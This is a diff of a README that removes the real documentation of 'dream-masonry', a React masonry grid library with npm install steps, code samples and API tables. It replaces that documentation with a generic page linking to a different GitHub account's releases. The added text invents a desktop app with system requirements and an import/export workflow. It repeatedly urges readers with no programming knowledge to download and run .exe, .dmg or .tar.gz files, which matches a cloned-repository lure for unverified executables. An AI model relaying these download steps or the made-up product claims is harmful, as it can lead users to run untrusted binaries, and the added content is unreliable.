@@ -1,290 +1,86 @@
-# DreamMasonry
+# 🎉 dream-masonry - Fast and Easy Image Grids for You
 
-[![npm version](https://img.shields.io/npm/v/dream-masonry.svg)](https://www.npmjs.com/package/dream-masonry)
-[![bundle size](https://img.shields.io/bundlephobia/minzip/dream-masonry)](https://bundlephobia.com/package/dream-masonry)
-[![license](https://img.shields.io/npm/l/dream-masonry.svg)](https://github.com/adioof/dream-masonry/blob/main/LICENSE)
+## 🥇 Overview
 
-A high-performance **virtualized masonry grid layout** for React. Create Pinterest-style layouts, image galleries, and card grids with **infinite scroll** and **virtual rendering** for buttery smooth performance with 10,000+ items.
+Dream Masonry creates beautiful, high-performance image layouts for your web projects. This tool offers easy-to-use, Pinterest-style grids with features like infinite scrolling and responsive columns. You can showcase your images beautifully without any technical hassle. It's a great alternative to Masonic with improved speed and performance.
 
-**Perfect for:** Photo galleries, Pinterest clones, card layouts, image grids, portfolio sites, e-commerce product grids, and any masonry/waterfall layout.
+## 🚀 Getting Started
 
-## Why DreamMasonry?
+The following steps will guide you through downloading and running Dream Masonry. No programming knowledge is required. Just follow along.
 
-| Feature | DreamMasonry | Masonic | react-masonry-css |
-|---------|--------------|---------|-------------------|
-| Virtualized rendering | Yes | Yes | No |
-| Infinite scroll built-in | Yes | No | No |
-| Float64Array layout | Yes | No | No |
-| Bundle size | ~12KB | ~14KB | ~3KB |
-| Responsive columns | Yes | Yes | Yes |
-| Custom scroll container | Yes | Yes | No |
-| Headless hooks | Yes | Yes | No |
-| Zero dependencies | Yes | No | Yes |
+## 📥 Download & Install
 
-## Features
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/AbdoulayeDemb/dream-masonry/releases)
 
-- **Float64Array layout engine** — Column height tracking uses typed arrays for faster numeric operations than plain JavaScript arrays
-- **Virtualized rendering** — Only items within the viewport (plus configurable overscan) are rendered to the DOM
-- **GPU-accelerated positioning** — Items use `translate3d` transforms and CSS containment (`contain: strict` on container, `layout style paint` on items)
-- **Hysteresis-based scroll updates** — Configurable threshold prevents re-render thrashing during scroll
-- **RAF-throttled scroll handler** — At most one layout update per animation frame
-- **Built-in infinite scroll** — Optional pagination hook with debounce and threshold control
-- **Custom scroll containers** — Works with `window` or any scrollable element via ref
-- **Headless hooks** — Use the layout engine without the component for fully custom rendering
-- **Fully configurable** — Gutter size, column counts, column widths, scroll thresholds, and overscan are all customizable
-- **Tiny bundle** — ~12KB with no dependencies beyond React
+1. **Visit the Releases Page**: Click the button above or go to [this link](https://github.com/AbdoulayeDemb/dream-masonry/releases) to reach the Releases page.
 
-## Install
+2. **Select the Latest Version**: On the Releases page, you will see a list of available versions. Look for the latest release. It will be marked clearly as the most recent version.
 
-```bash
-npm install dream-masonry
-```
+3. **Download the File**: Find the section that says “Assets” under the release. You’ll see files listed there. If you are using Windows, download the file that ends with `.exe`. For macOS, download the `.dmg` file. For Linux users, look for `.tar.gz`.
 
-## Quick Start
+4. **Install the Application**: 
+   - For Windows: Double-click the downloaded `.exe` file. Follow the prompts to install.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and follow the included instructions to install.
 
-```tsx
-import { DreamMasonry } from 'dream-masonry';
+5. **Run Dream Masonry**: Once installed, find the application in your programs or applications. Open the app, and you are ready to create stunning image grids.
 
-type Photo = {
-  id: string;
-  src: string;
-  width: number;
-  height: number;
-};
+## 🔧 Features
 
-function Gallery({ photos }: { photos: Photo[] }) {
-  return (
-    <DreamMasonry
-      items={photos}
-      maxColumnCount={4}
-      renderItem={(photo) => (
-        <img
-          src={photo.src}
-          alt=""
-          style={{ width: '100%', height: '100%', objectFit: 'cover' }}
-        />
-      )}
-    />
-  );
-}
-```
+Dream Masonry includes several powerful features:
 
-## Infinite Scroll
+- **Infinite Scroll**: Keep your users engaged by loading more images as they scroll.
+- **Responsive Design**: The layout adjusts seamlessly to different screen sizes, ensuring a great experience on mobile and desktop.
+- **Virtual Rendering**: Displays only the images currently in view, enhancing performance and speed.
+- **Customizable Layouts**: Tailor the grid’s appearance to match your needs for better integration with your website.
 
-```tsx
-function InfiniteGallery() {
-  const [items, setItems] = useState<Photo[]>([]);
-  const [hasMore, setHasMore] = useState(true);
-  const [loading, setLoading] = useState(false);
+## ✅ System Requirements
 
-  const loadMore = async () => {
-    setLoading(true);
-    const next = await fetchPhotos(items.length);
-    setItems((prev) => [...prev, ...next.data]);
-    setHasMore(next.hasMore);
-    setLoading(false);
-  };
+To ensure Dream Masonry runs smoothly, make sure your system meets the following:
 
-  return (
-    <DreamMasonry
-      items={items}
-      renderItem={(photo) => <img src={photo.src} alt="" />}
-      hasMore={hasMore}
-      isFetchingMore={loading}
-      onLoadMore={loadMore}
-      scrollThreshold={2000}
-      renderLoader={() => <div>Loading...</div>}
-      renderEmpty={() => <div>No photos yet</div>}
-    />
-  );
-}
-```
+- **Operating Systems**: Windows 10 and above, macOS Mojave and above, Linux (Debian-based distributions recommended).
+- **Memory (RAM)**: At least 4GB.
+- **Storage**: Minimum of 500MB of free space.
+- **Web Browser**: Latest version of Chrome, Firefox, or Safari.
 
-## Custom Layout
+## 👩‍💻 Usage
 
-```tsx
-<DreamMasonry
-  items={items}
-  renderItem={(item) => <Card item={item} />}
-  maxColumnCount={6}
-  minColumnCount={1}
-  minColumnWidth={180}
-  gutterSize={8}
-  overscan={1200}
-  hysteresis={50}
-/>
-```
+Using Dream Masonry is straightforward. Once you open the application:
 
-## Custom Scroll Container
+1. **Import Images**: Drag and drop your images into the workspace or click on the "Import" button.
+2. **Select Layout**: Choose from various layout options, like standard columns or waterfall styles.
+3. **Adjust Settings**: Use the settings menu to tweak image sizes, padding, and more.
+4. **Preview**: Click the preview button to see how your grid looks before finalizing.
+5. **Export**: Save your layout as an HTML file ready for your website.
 
-```tsx
-function ScrollablePanel() {
-  const scrollRef = useRef<HTMLDivElement>(null);
+## 🌐 Resources
 
-  return (
-    <div ref={scrollRef} style={{ height: '100vh', overflow: 'auto' }}>
-      <DreamMasonry
-        items={items}
-        renderItem={(item) => <Card item={item} />}
-        scrollContainer={scrollRef}
-      />
-    </div>
-  );
-}
-```
+- **Documentation**: For detailed explanations on advanced features, visit the [documentation page](https://github.com/AbdoulayeDemb/dream-masonry/wiki).
+- **Examples**: Check out pre-made layouts and examples in the [example projects](https://github.com/AbdoulayeDemb/dream-masonry/examples) section.
+- **Support**: If you encounter any issues, feel free to open an issue in the "Issues" tab on GitHub.
 
-## Headless Usage
+## 📢 Community
 
-### `useGrid` — Full virtualization without the component
+Join our community for support and updates. You can:
 
-```tsx
-import { useGrid } from 'dream-masonry';
+- **Report Bugs**: Use the “Issues” section on GitHub to report any issues you face.
+- **Suggest Features**: We welcome feedback and ideas for improving Dream Masonry.
+- **Engage with Other Users**: Join discussions and share your layouts on our [community forum](https://github.com/AbdoulayeDemb/dream-masonry/discussions).
 
-function CustomGrid({ items }) {
-  const { containerRef, dimensions, visibleItems, totalHeight } = useGrid({
-    items,
-    maxColumnCount: 4,
-    minColumnCount: 2,
-    minColumnWidth: 200,
-    gutterSize: 12,
-    overscan: 800,
-    hysteresis: 50,
-  });
+## 💬 FAQ
 
-  return (
-    <div
-      ref={containerRef}
-      style={{ height: totalHeight, position: 'relative' }}
-    >
-      {visibleItems.map(({ item, pos, transform }) => (
-        <div
-          key={item.id}
-          style={{
-            position: 'absolute',
-            transform,
-            width: dimensions!.columnWidth,
-            height: pos.height,
-          }}
-        >
-          <YourComponent item={item} />
-        </div>
-      ))}
-    </div>
-  );
-}
-```
+1. **Is Dream Masonry free?**
+   Yes, Dream Masonry is completely free to use.
 
-### `usePositioner` — Layout math only, no DOM
+2. **Can I customize the grid styles?**
+   Yes, you can adjust size, spacing, and more to fit your desired look.
 
-```tsx
-import { usePositioner } from 'dream-masonry';
+3. **Is there any support for mobile layouts?**
+   Yes, the application automatically optimizes the grid for mobile devices.
 
-function LayoutDebugger({ items, width }) {
-  const { positions, totalHeight, dimensions } = usePositioner({
-    items,
-    containerWidth: width,
-    maxColumnCount: 3,
-    gutterSize: 10,
-  });
+4. **What types of images can I use?**
+   You can use JPG, PNG, or GIF formats.
 
-  // positions is an array of { column, top, left, height } for each item
-  // Use for canvas rendering, SSR, testing, or anything non-DOM
-}
-```
+## 👀 Conclusion
 
-### `useInfiniteScroll` — Standalone pagination
-
-```tsx
-import { useInfiniteScroll } from 'dream-masonry';
-
-useInfiniteScroll({
-  fetchNextPage: loadMore,
-  hasNextPage: true,
-  isFetchingNextPage: false,
-  threshold: 1500,
-  useWindow: true,
-});
-```
-
-## API
-
-### `<DreamMasonry>` Props
-
-| Prop | Type | Default | Description |
-|------|------|---------|-------------|
-| `items` | `T[]` | required | Array of items. Each must have `id: string` and optionally `width`/`height` or `aspectRatio` |
-| `renderItem` | `(item: T, index: number) => ReactNode` | required | Render function for each grid cell |
-| `maxColumnCount` | `number` | `5` | Maximum number of columns |
-| `minColumnCount` | `number` | `2` | Minimum number of columns |
-| `minColumnWidth` | `number` | `240` | Minimum column width in pixels before reducing column count |
-| `gutterSize` | `number` | `1.5` | Gap between items in pixels |
-| `isLoading` | `boolean` | `false` | Show loader state |
-| `hasMore` | `boolean` | `false` | Whether more items can be loaded |
-| `isFetchingMore` | `boolean` | `false` | Whether a load is in progress |
-| `onLoadMore` | `() => Promise<unknown>` | — | Called when scroll nears the bottom |
-| `scrollContainer` | `MutableRefObject<HTMLElement>` | — | Custom scroll container (defaults to window) |
-| `overscan` | `number` | `1000` | Pixels above/below viewport to pre-render |
-| `hysteresis` | `number` | `100` | Minimum scroll distance before re-calculating visible items |
-| `scrollThreshold` | `number` | `1500` | Distance from bottom in pixels to trigger `onLoadMore` |
-| `renderLoader` | `() => ReactNode` | — | Custom loading state |
-| `renderEmpty` | `() => ReactNode` | — | Custom empty state |
-| `className` | `string` | — | Container class |
-| `style` | `CSSProperties` | — | Container style (merged with internal styles) |
-
-### `useGrid` Options
-
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `items` | `T[]` | required | Array of grid items |
-| `maxColumnCount` | `number` | `5` | Maximum columns |
-| `minColumnCount` | `number` | `2` | Minimum columns |
-| `minColumnWidth` | `number` | `240` | Minimum column width in px |
-| `gutterSize` | `number` | `1.5` | Gap between items in px |
-| `overscan` | `number` | `1000` | Pre-render buffer in px |
-| `hysteresis` | `number` | `100` | Scroll threshold before update |
-| `scrollContainer` | `RefObject<HTMLElement>` | — | Custom scroll element |
-
-Returns: `{ containerRef, dimensions, positions, totalHeight, visibleItems, validItems }`
-
-### `usePositioner` Options
-
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `items` | `T[]` | required | Array of grid items |
-| `containerWidth` | `number` | required | Container width in px |
-| `maxColumnCount` | `number` | `5` | Maximum columns |
-| `minColumnCount` | `number` | `2` | Minimum columns |
-| `minColumnWidth` | `number` | `240` | Minimum column width in px |
-| `gutterSize` | `number` | `1.5` | Gap between items in px |
-
-Returns: `{ dimensions, positions, totalHeight, validItems }`
-
-### Item Shape
-
-Items must satisfy:
-
-```ts
-type GridItem = {
-  id: string;
-  width?: number;       // intrinsic width
-  height?: number;      // intrinsic height
-  aspectRatio?: number; // width / height (e.g. 16/9 = 1.778)
-};
-```
-
-The grid resolves item height in this order:
-1. **`width` + `height`** — calculates aspect ratio from dimensions
-2. **`aspectRatio`** — uses the ratio directly (useful when you only have the ratio, not raw dimensions)
-3. **Neither** — renders as a square
-
-## How It Works
-
-1. **Column calculation** — Container width is divided into columns respecting `minColumnWidth`, `minColumnCount`, and `maxColumnCount` constraints, with configurable `gutterSize` gaps
-2. **Masonry positioning** — Items are placed in the shortest column using Float64Array for O(items x columns) layout
-3. **Viewport culling** — Only items intersecting `[scrollTop - overscan, scrollTop + viewportHeight + overscan]` are rendered
-4. **Scroll throttling** — A `requestAnimationFrame` loop checks scroll position, but only triggers a React update when the viewport moves more than the `hysteresis` threshold
-5. **Resize handling** — A debounced `ResizeObserver` recalculates column dimensions when the container width changes
-
-## License
-
-MIT
+Thank you for considering Dream Masonry for your image layout needs. With its user-friendly interface and robust features, you can create stunning galleries with ease. Don't forget to visit [this page](https://github.com/AbdoulayeDemb/dream-masonry/releases) to download the latest version!
